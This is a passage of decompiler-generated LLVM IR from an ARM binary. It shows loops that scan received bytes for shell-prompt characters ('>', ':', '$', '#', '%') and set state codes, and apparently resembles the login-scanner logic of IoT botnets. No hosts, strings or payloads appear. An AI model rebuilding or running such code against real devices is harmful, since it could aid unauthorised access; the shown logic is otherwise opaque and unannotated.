  br i1 %tmp443, label %dec_label_pc_ef14.backedge.thread, label %dec_label_pc_f57c

dec_label_pc_f57c:                                ; preds = %dec_label_pc_f56c
  %v2_f57c = add i32 %v1_f570, %v0_ef90
  store i32 %v2_f57c, i32* %r3.global-to-local, align 4
  %v1_f580 = add i32 %v2_f57c, 28
  %v2_f580 = inttoptr i32 %v1_f580 to i8*
  %v3_f580 = load i8, i8* %v2_f580, align 1
  %v4_f580 = zext i8 %v3_f580 to i32
  store i32 %v4_f580, i32* %r3.global-to-local, align 4
  %v2_f584 = icmp ugt i8 %v3_f580, 61
  store i1 %v2_f584, i1* %cpsr_c.global-to-local, align 1
  %v7_f584 = icmp eq i8 %v3_f580, 62
  store i1 %v7_f584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f584, label %dec_label_pc_f5e8, label %bb444

bb444:                                            ; preds = %dec_label_pc_f57c
  %v3_f588 = icmp ugt i8 %v3_f580, 57
  store i1 %v3_f588, i1* %cpsr_c.global-to-local, align 1
  %v8_f588 = icmp eq i8 %v3_f580, 58
  store i1 %v8_f588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f588, label %dec_label_pc_f5e8, label %dec_label_pc_f590

dec_label_pc_f590:                                ; preds = %bb444
  %v2_f590 = icmp ugt i8 %v3_f580, 35
  store i1 %v2_f590, i1* %cpsr_c.global-to-local, align 1
  %v7_f590 = icmp eq i8 %v3_f580, 36
  store i1 %v7_f590, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f590, label %dec_label_pc_f5e8, label %dec_label_pc_f598

dec_label_pc_f598:                                ; preds = %dec_label_pc_f590
  %v2_f598 = icmp ugt i8 %v3_f580, 34
  store i1 %v2_f598, i1* %cpsr_c.global-to-local, align 1
  %v7_f598 = icmp eq i8 %v3_f580, 35
  store i1 %v7_f598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f598, label %dec_label_pc_f5e8, label %dec_label_pc_f5a0

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f598
  %v2_f5a0 = icmp ugt i8 %v3_f580, 36
  store i1 %v2_f5a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5a0 = icmp eq i8 %v3_f580, 37
  store i1 %v7_f5a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5a0, label %dec_label_pc_f5e8, label %dec_label_pc_f5d0.preheader

dec_label_pc_f5d0.preheader:                      ; preds = %dec_label_pc_f5a0
  %v3_f5a4 = add i32 %v0_ef90, 28
  %v2_f5a8 = add i32 %v3_f5a4, %v3_f56c
  store i32 %v2_f5a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f5d0

dec_label_pc_f5b4:                                ; preds = %bb445
  %v2_f5b4 = icmp ugt i8 %v3_f5d8, 35
  store i1 %v2_f5b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5b4 = icmp eq i8 %v3_f5d8, 36
  store i1 %v7_f5b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5b4, label %dec_label_pc_f5e8, label %dec_label_pc_f5bc

dec_label_pc_f5bc:                                ; preds = %dec_label_pc_f5b4
  %v2_f5bc = icmp ugt i8 %v3_f5d8, 34
  store i1 %v2_f5bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f5bc = icmp eq i8 %v3_f5d8, 35
  store i1 %v7_f5bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5bc, label %dec_label_pc_f5e8, label %dec_label_pc_f5c4

dec_label_pc_f5c4:                                ; preds = %dec_label_pc_f5bc
  %v2_f5c4 = icmp ugt i8 %v3_f5d8, 36
  store i1 %v2_f5c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5c4 = icmp eq i8 %v3_f5d8, 37
  store i1 %v7_f5c4, i1* %cpsr_z.global-to-local, align 1
  %v1_f5c8 = add i32 %v0_f5c8, -1
  store i32 %v1_f5c8, i32* %r3.global-to-local, align 4
  br i1 %v7_f5c4, label %dec_label_pc_f5e8, label %dec_label_pc_f5d0

dec_label_pc_f5d0:                                ; preds = %dec_label_pc_f5d0.preheader, %dec_label_pc_f5c4
  %v0_f5c8 = phi i32 [ %v2_f5a8, %dec_label_pc_f5d0.preheader ], [ %v1_f5c8, %dec_label_pc_f5c4 ]
  %v0_f5d0 = phi i32 [ %v1_f570, %dec_label_pc_f5d0.preheader ], [ %v1_f5d0, %dec_label_pc_f5c4 ]
  %v1_f5d0 = add i32 %v0_f5d0, -1
  store i32 %v1_f5d0, i32* %r1.global-to-local, align 4
  %v2_f5d0 = icmp ne i32 %v0_f5d0, 0
  store i1 %v2_f5d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5d0 = icmp eq i32 %v0_f5d0, 1
  store i1 %v7_f5d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5d0, label %dec_label_pc_ef14.backedge.thread561, label %dec_label_pc_f5d8

dec_label_pc_f5d8:                                ; preds = %dec_label_pc_f5d0
  %v1_f5d8 = add i32 %v0_f5c8, -2
  %v2_f5d8 = inttoptr i32 %v1_f5d8 to i8*
  %v3_f5d8 = load i8, i8* %v2_f5d8, align 1
  %v4_f5d8 = zext i8 %v3_f5d8 to i32
  store i32 %v4_f5d8, i32* %r2.global-to-local, align 4
  %v2_f5dc = icmp ugt i8 %v3_f5d8, 61
  store i1 %v2_f5dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f5dc = icmp eq i8 %v3_f5d8, 62
  store i1 %v7_f5dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5dc, label %dec_label_pc_f5e8, label %bb445

bb445:                                            ; preds = %dec_label_pc_f5d8
  %v3_f5e0 = icmp ugt i8 %v3_f5d8, 57
  store i1 %v3_f5e0, i1* %cpsr_c.global-to-local, align 1
  %v8_f5e0 = icmp eq i8 %v3_f5d8, 58
  store i1 %v8_f5e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f5e0, label %dec_label_pc_f5e8, label %dec_label_pc_f5b4

dec_label_pc_f5e8:                                ; preds = %dec_label_pc_f5d8, %bb445, %dec_label_pc_f5c4, %dec_label_pc_f5bc, %dec_label_pc_f5b4, %dec_label_pc_f5a0, %dec_label_pc_f57c, %dec_label_pc_f598, %dec_label_pc_f590, %bb444
  %v0_f5ec = phi i32 [ %v1_f570, %dec_label_pc_f5a0 ], [ %v1_f570, %dec_label_pc_f57c ], [ %v1_f570, %dec_label_pc_f598 ], [ %v1_f570, %dec_label_pc_f590 ], [ %v1_f570, %bb444 ], [ %v1_f5d0, %dec_label_pc_f5b4 ], [ %v1_f5d0, %dec_label_pc_f5bc ], [ %v1_f5d0, %dec_label_pc_f5c4 ], [ %v1_f5d0, %bb445 ], [ %v1_f5d0, %dec_label_pc_f5d8 ]
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_f5ec = add i32 %v0_f5ec, 1
  store i32 %v1_f5ec, i32* @r7, align 4
  %v1_f5f0 = call i32 @function_fd40(i32 4)
  store i32 %v2_f7c4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_f600 = call i32 @function_fc7c(i32 4, i32* nonnull %stack_var_-60)
  store i32 %v3_f600, i32* %r0.global-to-local, align 4
  %v3_f604 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f604, i32* %r2.global-to-local, align 4
  store i32 %v3_f600, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f610 = load i32, i32* @r6, align 4
  %v1_f610 = add i32 %v0_f610, 4
  %v2_f610 = inttoptr i32 %v1_f610 to i32*
  %v3_f610 = load i32, i32* %v2_f610, align 4
  store i32 %v3_f610, i32* %r0.global-to-local, align 4
  %v4_f614 = call i32 @function_11300(i32 %v3_f610, i32 %v3_f600, i32 %v3_f604, i32 16384)
  store i32 %v4_f614, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f624 = load i32, i32* @r6, align 4
  %v1_f624 = add i32 %v0_f624, 4
  %v2_f624 = inttoptr i32 %v1_f624 to i32*
  %v3_f624 = load i32, i32* %v2_f624, align 4
  store i32 %v3_f624, i32* %r0.global-to-local, align 4
  %v4_f628 = call i32 @function_11300(i32 %v3_f624, i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_f630 = call i32 @function_fca0(i32 4)
  store i32 %v1_f630, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_f638 = load i32, i32* @r6, align 4
  %v2_f638 = add i32 %v1_f638, 12
  %v3_f638 = inttoptr i32 %v2_f638 to i32*
  store i32 8, i32* %v3_f638, align 4
  br label %dec_label_pc_f0ac

dec_label_pc_f640:                                ; preds = %dec_label_pc_ef90
  %v1_f640 = add i32 %v0_ef90, 24
  %v2_f640 = inttoptr i32 %v1_f640 to i32*
  %v3_f640 = load i32, i32* %v2_f640, align 4
  store i32 %v3_f640, i32* %r2.global-to-local, align 4
  %v1_f644 = add i32 %v3_f640, -1
  store i32 %v1_f644, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f648 = icmp eq i32 %v1_f644, 0
  store i1 %v2_f648, i1* %cpsr_z.global-to-local, align 1
  %tmp446 = icmp slt i32 %v1_f644, 1
  br i1 %tmp446, label %dec_label_pc_f6ac, label %dec_label_pc_f650

dec_label_pc_f650:                                ; preds = %dec_label_pc_f640
  %v2_f650 = add i32 %v1_f644, %v0_ef90
  store i32 %v2_f650, i32* %r3.global-to-local, align 4
  %v1_f654 = add i32 %v2_f650, 28
  %v2_f654 = inttoptr i32 %v1_f654 to i8*
  %v3_f654 = load i8, i8* %v2_f654, align 1
  %v4_f654 = zext i8 %v3_f654 to i32
  store i32 %v4_f654, i32* %r3.global-to-local, align 4
  %v2_f658 = icmp ugt i8 %v3_f654, 61
  store i1 %v2_f658, i1* %cpsr_c.global-to-local, align 1
  %v7_f658 = icmp eq i8 %v3_f654, 62
  store i1 %v7_f658, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f658, label %dec_label_pc_f914, label %bb447

bb447:                                            ; preds = %dec_label_pc_f650
  %v3_f65c = icmp ugt i8 %v3_f654, 57
  store i1 %v3_f65c, i1* %cpsr_c.global-to-local, align 1
  %v8_f65c = icmp eq i8 %v3_f654, 58
  store i1 %v8_f65c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f65c, label %dec_label_pc_f914, label %dec_label_pc_f664

dec_label_pc_f664:                                ; preds = %bb447
  %v2_f664 = icmp ugt i8 %v3_f654, 35
  store i1 %v2_f664, i1* %cpsr_c.global-to-local, align 1
  %v7_f664 = icmp eq i8 %v3_f654, 36
  store i1 %v7_f664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f664, label %dec_label_pc_f914, label %dec_label_pc_f66c

dec_label_pc_f66c:                                ; preds = %dec_label_pc_f664
  %v2_f66c = icmp ugt i8 %v3_f654, 34
  store i1 %v2_f66c, i1* %cpsr_c.global-to-local, align 1
  %v7_f66c = icmp eq i8 %v3_f654, 35
  store i1 %v7_f66c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f66c, label %dec_label_pc_f914, label %dec_label_pc_f6a4.preheader

dec_label_pc_f6a4.preheader:                      ; preds = %dec_label_pc_f66c
  %v3_f670 = add i32 %v0_ef90, 28
  %v2_f674 = add i32 %v3_f670, %v3_f640
  store i32 %v2_f674, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f6a4

dec_label_pc_f680:                                ; preds = %dec_label_pc_f6a4
  %v1_f680 = add i32 %v0_f69c, -2
  %v2_f680 = inttoptr i32 %v1_f680 to i8*
  %v3_f680 = load i8, i8* %v2_f680, align 1
  %v4_f680 = zext i8 %v3_f680 to i32
  store i32 %v4_f680, i32* %r2.global-to-local, align 4
  %v2_f684 = icmp ugt i8 %v3_f680, 61
  store i1 %v2_f684, i1* %cpsr_c.global-to-local, align 1
  %v7_f684 = icmp eq i8 %v3_f680, 62
  store i1 %v7_f684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f684, label %dec_label_pc_f914, label %bb448

bb448:                                            ; preds = %dec_label_pc_f680
  %v3_f688 = icmp ugt i8 %v3_f680, 57
  store i1 %v3_f688, i1* %cpsr_c.global-to-local, align 1
  %v8_f688 = icmp eq i8 %v3_f680, 58
  store i1 %v8_f688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f688, label %dec_label_pc_f914, label %dec_label_pc_f690

dec_label_pc_f690:                                ; preds = %bb448
  %v2_f690 = icmp ugt i8 %v3_f680, 35
  store i1 %v2_f690, i1* %cpsr_c.global-to-local, align 1
  %v7_f690 = icmp eq i8 %v3_f680, 36
  store i1 %v7_f690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f690, label %dec_label_pc_f914, label %dec_label_pc_f698

dec_label_pc_f698:                                ; preds = %dec_label_pc_f690
  %v2_f698 = icmp ugt i8 %v3_f680, 34
  store i1 %v2_f698, i1* %cpsr_c.global-to-local, align 1
  %v7_f698 = icmp eq i8 %v3_f680, 35
  store i1 %v7_f698, i1* %cpsr_z.global-to-local, align 1
  %v1_f69c = add i32 %v0_f69c, -1
  store i32 %v1_f69c, i32* %r3.global-to-local, align 4
  br i1 %v7_f698, label %dec_label_pc_f914, label %dec_label_pc_f6a4

dec_label_pc_f6a4:                                ; preds = %dec_label_pc_f6a4.preheader, %dec_label_pc_f698
  %v0_f69c = phi i32 [ %v2_f674, %dec_label_pc_f6a4.preheader ], [ %v1_f69c, %dec_label_pc_f698 ]
  %v0_f6a4 = phi i32 [ %v1_f644, %dec_label_pc_f6a4.preheader ], [ %v1_f6a4, %dec_label_pc_f698 ]
  %v1_f6a4 = add i32 %v0_f6a4, -1
  store i32 %v1_f6a4, i32* %r1.global-to-local, align 4
  %v2_f6a4 = icmp ne i32 %v0_f6a4, 0
  store i1 %v2_f6a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f6a4 = icmp eq i32 %v0_f6a4, 1
  store i1 %v7_f6a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6a4, label %dec_label_pc_f6ac, label %dec_label_pc_f680

dec_label_pc_f6ac:                                ; preds = %dec_label_pc_f6a4, %dec_label_pc_f640
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_f6b0 = call i32 @function_fd40(i32 25)
  store i32 %v2_f7c4, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_f6c0 = call i32 @function_fc7c(i32 25, i32* nonnull %stack_var_-60)
  %v3_f6c4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f6c0, i32* %r2.global-to-local, align 4
  %v1_f6cc = add i32 %v3_f6c4, -1
  store i32 %v1_f6cc, i32* %r3.global-to-local, align 4
  %v0_f6d0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f6d0, i32* %r0.global-to-local, align 4
  %v0_f6d4 = load i32, i32* @r6, align 4
  %v1_f6d4 = add i32 %v0_f6d4, 24
  %v2_f6d4 = inttoptr i32 %v1_f6d4 to i32*
  %v3_f6d4 = load i32, i32* %v2_f6d4, align 4
  store i32 %v3_f6d4, i32* %r1.global-to-local, align 4
  %v4_f6d8 = call i32 @function_101d8(i32 %v0_f6d0, i32 %v3_f6d4, i32 %v3_f6c0, i32 %v1_f6cc)
  store i32 %v4_f6d8, i32* %r0.global-to-local, align 4
  %v1_f6dc = add i32 %v4_f6d8, 1
  store i32 %v1_f6dc, i32* @r7, align 4
  %v2_f6dc = icmp eq i32 %v4_f6d8, -1
  store i1 %v2_f6dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f6dc = icmp eq i32 %v1_f6dc, 0
  store i1 %v7_f6dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6dc, label %thread-pre-split124, label %bb449

bb449:                                            ; preds = %dec_label_pc_f6ac
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split124

thread-pre-split124:                              ; preds = %dec_label_pc_f6ac, %bb449
  %v0_f6e4 = phi i1 [ false, %bb449 ], [ true, %dec_label_pc_f6ac ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_f6e4, i1* %cpsr_z.global-to-local, align 1
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_fb30 = call i32 @function_fca0(i32 25)
  br i1 %v0_f6e4, label %dec_label_pc_fb2c, label %dec_label_pc_f6f4

dec_label_pc_f6f4:                                ; preds = %thread-pre-split124, %dec_label_pc_f914
  %storemerge = phi i32 [ %v1_f91c, %dec_label_pc_f914 ], [ %v1_fb30, %thread-pre-split124 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v0_f6f4 = load i32, i32* @r6, align 4
  %v1_f6f4 = inttoptr i32 %v0_f6f4 to i32*
  %v2_f6f4 = load i32, i32* %v1_f6f4, align 4
  store i32 %v2_f6f4, i32* %r3.global-to-local, align 4
  %v1_f6f8 = add i32 %v0_f6f4, 4
  %v2_f6f8 = inttoptr i32 %v1_f6f8 to i32*
  %v3_f6f8 = load i32, i32* %v2_f6f8, align 4
  store i32 %v3_f6f8, i32* %r0.global-to-local, align 4
  %v1_f6fc = add i32 %v2_f6f4, 13
  %v2_f6fc = inttoptr i32 %v1_f6fc to i8*
  %v3_f6fc = load i8, i8* %v2_f6fc, align 1
  %v4_f6fc = zext i8 %v3_f6fc to i32
  store i32 %v4_f6fc, i32* %r2.global-to-local, align 4
  %v1_f700 = add i32 %v2_f6f4, 4
  %v2_f700 = inttoptr i32 %v1_f700 to i32*
  %v3_f700 = load i32, i32* %v2_f700, align 4
  store i32 %v3_f700, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f708 = call i32 @function_11300(i32 %v3_f6f8, i32 %v3_f700, i32 %v4_f6fc, i32 16384)
  store i32 %v4_f708, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f710 = load i32, i32* @r6, align 4
  %v1_f710 = add i32 %v0_f710, 4
  %v2_f710 = inttoptr i32 %v1_f710 to i32*
  %v3_f710 = load i32, i32* %v2_f710, align 4
  store i32 %v3_f710, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f71c = call i32 @function_11300(i32 %v3_f710, i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32 2, i32 16384)
  store i32 %v4_f71c, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_f724 = load i32, i32* @r6, align 4
  %v2_f724 = add i32 %v1_f724, 12
  %v3_f724 = inttoptr i32 %v2_f724 to i32*
  store i32 5, i32* %v3_f724, align 4
  br label %dec_label_pc_f728

dec_label_pc_f728:                                ; preds = %dec_label_pc_f33c, %bb436, %dec_label_pc_f838, %dec_label_pc_f970, %dec_label_pc_f8dc, %dec_label_pc_f9b4, %dec_label_pc_f6f4
  %v0_f728 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f728 = icmp eq i32 %v0_f728, 0
  store i1 %v2_f728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f728, label %dec_label_pc_ef10.loopexit, label %dec_label_pc_f0ac

dec_label_pc_f734:                                ; preds = %dec_label_pc_ef90
  %v1_f734 = add i32 %v0_ef90, 24
  %v2_f734 = inttoptr i32 %v1_f734 to i32*
  %v3_f734 = load i32, i32* %v2_f734, align 4
  store i32 %v3_f734, i32* %r2.global-to-local, align 4
  %v1_f738 = add i32 %v3_f734, -1
  store i32 %v1_f738, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f73c = icmp eq i32 %v1_f738, 0
  store i1 %v2_f73c, i1* %cpsr_z.global-to-local, align 1
  %tmp450 = icmp slt i32 %v1_f738, 1
  br i1 %tmp450, label %dec_label_pc_f7b0, label %dec_label_pc_f744

dec_label_pc_f744:                                ; preds = %dec_label_pc_f734
  %v2_f744 = add i32 %v1_f738, %v0_ef90
  store i32 %v2_f744, i32* %r3.global-to-local, align 4
  %v1_f748 = add i32 %v2_f744, 28
  %v2_f748 = inttoptr i32 %v1_f748 to i8*
  %v3_f748 = load i8, i8* %v2_f748, align 1
  %v4_f748 = zext i8 %v3_f748 to i32
  store i32 %v4_f748, i32* %r3.global-to-local, align 4
  %v2_f74c = icmp ugt i8 %v3_f748, 61
  store i1 %v2_f74c, i1* %cpsr_c.global-to-local, align 1
  %v7_f74c = icmp eq i8 %v3_f748, 62
  store i1 %v7_f74c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f74c, label %dec_label_pc_f8c8, label %bb451

bb451:                                            ; preds = %dec_label_pc_f744
  %v3_f750 = icmp ugt i8 %v3_f748, 57
  store i1 %v3_f750, i1* %cpsr_c.global-to-local, align 1
  %v8_f750 = icmp eq i8 %v3_f748, 58
  store i1 %v8_f750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f750, label %dec_label_pc_f8c8, label %dec_label_pc_f758

dec_label_pc_f758:                                ; preds = %bb451
  %v2_f758 = icmp ugt i8 %v3_f748, 35
  store i1 %v2_f758, i1* %cpsr_c.global-to-local, align 1
  %v7_f758 = icmp eq i8 %v3_f748, 36
  store i1 %v7_f758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f758, label %dec_label_pc_f8c8, label %dec_label_pc_f760

dec_label_pc_f760:                                ; preds = %dec_label_pc_f758
  %v2_f760 = icmp ugt i8 %v3_f748, 34
  store i1 %v2_f760, i1* %cpsr_c.global-to-local, align 1
  %v7_f760 = icmp eq i8 %v3_f748, 35
  store i1 %v7_f760, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f760, label %dec_label_pc_f8c8, label %dec_label_pc_f768

dec_label_pc_f768:                                ; preds = %dec_label_pc_f760
  %v2_f768 = icmp ugt i8 %v3_f748, 36
  store i1 %v2_f768, i1* %cpsr_c.global-to-local, align 1
  %v7_f768 = icmp eq i8 %v3_f748, 37
  store i1 %v7_f768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f768, label %dec_label_pc_f8c8, label %dec_label_pc_f7a8.preheader

dec_label_pc_f7a8.preheader:                      ; preds = %dec_label_pc_f768
  %v3_f76c = add i32 %v0_ef90, 28
  %v2_f770 = add i32 %v3_f76c, %v3_f734
  store i32 %v2_f770, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f7a8

dec_label_pc_f77c:                                ; preds = %dec_label_pc_f7a8
  %v1_f77c = add i32 %v0_f7a0, -2
  %v2_f77c = inttoptr i32 %v1_f77c to i8*
  %v3_f77c = load i8, i8* %v2_f77c, align 1
  %v4_f77c = zext i8 %v3_f77c to i32
  store i32 %v4_f77c, i32* %r2.global-to-local, align 4
  %v2_f780 = icmp ugt i8 %v3_f77c, 61
  store i1 %v2_f780, i1* %cpsr_c.global-to-local, align 1
  %v7_f780 = icmp eq i8 %v3_f77c, 62
  store i1 %v7_f780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f780, label %dec_label_pc_f8c8, label %bb452

bb452:                                            ; preds = %dec_label_pc_f77c
  %v3_f784 = icmp ugt i8 %v3_f77c, 57
  store i1 %v3_f784, i1* %cpsr_c.global-to-local, align 1
  %v8_f784 = icmp eq i8 %v3_f77c, 58
  store i1 %v8_f784, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f784, label %dec_label_pc_f8c8, label %dec_label_pc_f78c

dec_label_pc_f78c:                                ; preds = %bb452
  %v2_f78c = icmp ugt i8 %v3_f77c, 35
  store i1 %v2_f78c, i1* %cpsr_c.global-to-local, align 1
  %v7_f78c = icmp eq i8 %v3_f77c, 36
  store i1 %v7_f78c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f78c, label %dec_label_pc_f8c8, label %dec_label_pc_f794

dec_label_pc_f794:                                ; preds = %dec_label_pc_f78c
  %v2_f794 = icmp ugt i8 %v3_f77c, 34
  store i1 %v2_f794, i1* %cpsr_c.global-to-local, align 1
  %v7_f794 = icmp eq i8 %v3_f77c, 35
  store i1 %v7_f794, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f794, label %dec_label_pc_f8c8, label %dec_label_pc_f79c

dec_label_pc_f79c:                                ; preds = %dec_label_pc_f794
  %v2_f79c = icmp ugt i8 %v3_f77c, 36
  store i1 %v2_f79c, i1* %cpsr_c.global-to-local, align 1
  %v7_f79c = icmp eq i8 %v3_f77c, 37
  store i1 %v7_f79c, i1* %cpsr_z.global-to-local, align 1
  %v1_f7a0 = add i32 %v0_f7a0, -1
  store i32 %v1_f7a0, i32* %r3.global-to-local, align 4
  br i1 %v7_f79c, label %dec_label_pc_f8c8, label %dec_label_pc_f7a8

dec_label_pc_f7a8:                                ; preds = %dec_label_pc_f7a8.preheader, %dec_label_pc_f79c
  %v0_f7a0 = phi i32 [ %v2_f770, %dec_label_pc_f7a8.preheader ], [ %v1_f7a0, %dec_label_pc_f79c ]
  %v0_f7a8 = phi i32 [ %v1_f738, %dec_label_pc_f7a8.preheader ], [ %v1_f7a8, %dec_label_pc_f79c ]
  %v1_f7a8 = add i32 %v0_f7a8, -1
  store i32 %v1_f7a8, i32* %r1.global-to-local, align 4
  %v2_f7a8 = icmp ne i32 %v0_f7a8, 0
  store i1 %v2_f7a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7a8 = icmp eq i32 %v0_f7a8, 1
  store i1 %v7_f7a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7a8, label %dec_label_pc_f7b0, label %dec_label_pc_f77c

dec_label_pc_f7b0:                                ; preds = %dec_label_pc_f7a8, %dec_label_pc_f734
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f7b4 = call i32 @function_fd40(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f7bc = call i32 @function_fd40(i32 27)
  store i32 %v2_f7c4, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_f7cc = call i32 @function_fc7c(i32 26, i32* nonnull %stack_var_-60)
  store i32 %v3_f7cc, i32* @r4, align 4
  store i32 %v2_f7c4, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_f7e0 = call i32 @function_fc7c(i32 27, i32* nonnull %stack_var_-60)
  %v3_f7e4 = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_f7e0, 16777216
  %v1_f7e8 = sdiv i32 %sext, 16777216
  store i32 %v1_f7e8, i32* @r5, align 4
  %v0_f7ec = load i32, i32* @r4, align 4
  store i32 %v0_f7ec, i32* %r2.global-to-local, align 4
  %v1_f7f0 = add i32 %v3_f7e4, -1
  store i32 %v1_f7f0, i32* %r3.global-to-local, align 4
  %v0_f7f4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f7f4, i32* %r0.global-to-local, align 4
  %v0_f7f8 = load i32, i32* @r6, align 4
  %v1_f7f8 = add i32 %v0_f7f8, 24
  %v2_f7f8 = inttoptr i32 %v1_f7f8 to i32*
  %v3_f7f8 = load i32, i32* %v2_f7f8, align 4
  store i32 %v3_f7f8, i32* %r1.global-to-local, align 4
  %v4_f7fc = call i32 @function_101d8(i32 %v0_f7f4, i32 %v3_f7f8, i32 %v0_f7ec, i32 %v1_f7f0)
  store i32 %v4_f7fc, i32* %r0.global-to-local, align 4
  %v2_f800 = icmp eq i32 %v4_f7fc, -1
  store i1 %v2_f800, i1* %cpsr_c.global-to-local, align 1
  %v7_f800 = icmp eq i32 %v4_f7fc, -1
  store i1 %v7_f800, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f800, label %dec_label_pc_f810, label %dec_label_pc_f838

dec_label_pc_f810:                                ; preds = %dec_label_pc_f7b0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_f810 = load i32, i32* %stack_var_-60, align 4
  %v0_f814 = load i32, i32* @r5, align 4
  store i32 %v0_f814, i32* %r2.global-to-local, align 4
  %v1_f818 = add i32 %v3_f810, -1
  store i32 %v1_f818, i32* %r3.global-to-local, align 4
  %v0_f81c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f81c, i32* %r0.global-to-local, align 4
  %v0_f820 = load i32, i32* @r6, align 4
  %v1_f820 = add i32 %v0_f820, 24
  %v2_f820 = inttoptr i32 %v1_f820 to i32*
  %v3_f820 = load i32, i32* %v2_f820, align 4
  store i32 %v3_f820, i32* %r1.global-to-local, align 4
  %v4_f824 = call i32 @function_101d8(i32 %v0_f81c, i32 %v3_f820, i32 %v0_f814, i32 %v1_f818)
  store i32 %v4_f824, i32* %r0.global-to-local, align 4
  %v1_f828 = add i32 %v4_f824, 1
  store i32 %v1_f828, i32* @r7, align 4
  %v2_f828 = icmp eq i32 %v4_f824, -1
  store i1 %v2_f828, i1* %cpsr_c.global-to-local, align 1
  %v7_f828 = icmp eq i32 %v1_f828, 0
  store i1 %v7_f828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f828, label %dec_label_pc_faec, label %dec_label_pc_f838

dec_label_pc_f838:                                ; preds = %dec_label_pc_f810, %dec_label_pc_f7b0
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f83c = call i32 @function_fca0(i32 26)
